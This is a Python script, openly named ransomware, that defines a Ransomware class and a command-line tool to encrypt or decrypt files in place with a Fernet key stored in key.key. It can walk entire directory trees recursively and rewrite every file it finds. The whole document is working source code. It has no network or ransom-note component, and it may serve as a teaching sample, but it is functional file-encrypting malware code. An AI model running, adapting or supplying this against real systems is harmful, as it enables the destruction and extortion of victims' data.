import argparse
import os
import re
from pathlib import Path

from cryptography.fernet import Fernet


KEY_FILE = Path('key.key')

class Ransomware:
    def __init__(self, key: bytes | str | Fernet) -> None:
        r""":param key: must be 32 url-safe base64-encoded bytes/string."""
        
        if type(key) is Fernet:
            self.fernet = key
        else:
            self.fernet = Fernet(key)

    def __secure_file(self, file):
        r"""Return a bool if a file exists and isn't the key or this file itself."""
        file = Path(file).resolve()
        return file.is_file() and not file.samefile(__file__) and not file.samefile(KEY_FILE)

    def __crypt_file(self, file, callback):
        r"""Read a file's data, modify it with a callback function that returns bytes and re-write the file. Return True if success."""
        if self.__secure_file(file):
            file = Path(file).resolve()
            data = file.read_bytes()
            new_data = callback(data)
            file.write_bytes(new_data)
            return True

    def is_encrypted(self, file):
        r"""Return True if a file is encrypted in base64."""
        if self.__secure_file(file):
            data = Path(file).resolve().read_text('utf-8', 'replace')
            match = re.match(r"^[A-Za-z0-9\_\-]+\=*$", data, re.MULTILINE)
            if match:
                return match.string == data and len(match.string) % 4 == 0 and len(data.strip().splitlines()) == 1

    def encrypt_file(self, file):
        r"""Encrypt a file and return True if success."""
        if not self.is_encrypted(file):
            return self.__crypt_file(file, self.fernet.encrypt)
    
    def decrypt_file(self, file):
        r"""Decrypt a file and return True if success."""
        if self.is_encrypted(file):
            return self.__crypt_file(file, self.fernet.decrypt)


def main():
    # Get arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices = ('encrypt', 'decrypt'), help = "choose to encrypt or decrypt the path")
    parser.add_argument('path', type = Path, help = "directory or file path")
    parser.add_argument('-k', '--key', type = Fernet, help = "custom 32 url-safe base64-encoded key")
    parser.add_argument('-r', '--recursive', action = 'store_true', help = "iterate in each subdirectory recursively. WARNING: use with caution")
    
    # Set arguments
    args = parser.parse_args()
    mode = args.mode
    path = args.path.resolve()
    key = args.key
    
    # Get key
    if key is None and KEY_FILE.exists():
        key = KEY_FILE.read_bytes()
    elif key is None and not KEY_FILE.exists():
        key = Fernet.generate_key()
        KEY_FILE.write_bytes(key)

    ransomware = Ransomware(key)

    # Get the respective ransomware execution method (encrypt or decrypt)
    if mode == 'encrypt':
        ransom_exec = ransomware.encrypt_file
    elif mode == 'decrypt':
        ransom_exec = ransomware.decrypt_file

    # If path is file, encrypt/decrypt it
    if path.is_file():
        if ransom_exec(path):
            print(f"{mode.upper()}ED: {path}")
    elif path.is_dir():
        # If path is a recursive directory, encrypt/decrypt each subdirectory
        if args.recursive:
            confirmation = input(f"WARNING: {path} (recursively)\nCONTINUE? (Y/n): ").strip().lower()
            if confirmation != 'n':
                for dirpath, dirnames, filenames in os.walk(path):
                    for filename in filenames:
                        file = Path(dirpath).joinpath(filename).resolve()
                        if ransom_exec(file):
                            print(f"{mode.upper()}ED: {file}")
        # If path is not a recursive directory, encrypt/decrypt its content
        else:
            for element in path.iterdir():
                if element.is_file():
                    if ransom_exec(element):
                        print(f"{mode.upper()}ED: {element}")
    # If path doesn't exist, print it
    else:
        print(f"NOT FOUND: {path}")

if __name__ == '__main__':
    main()
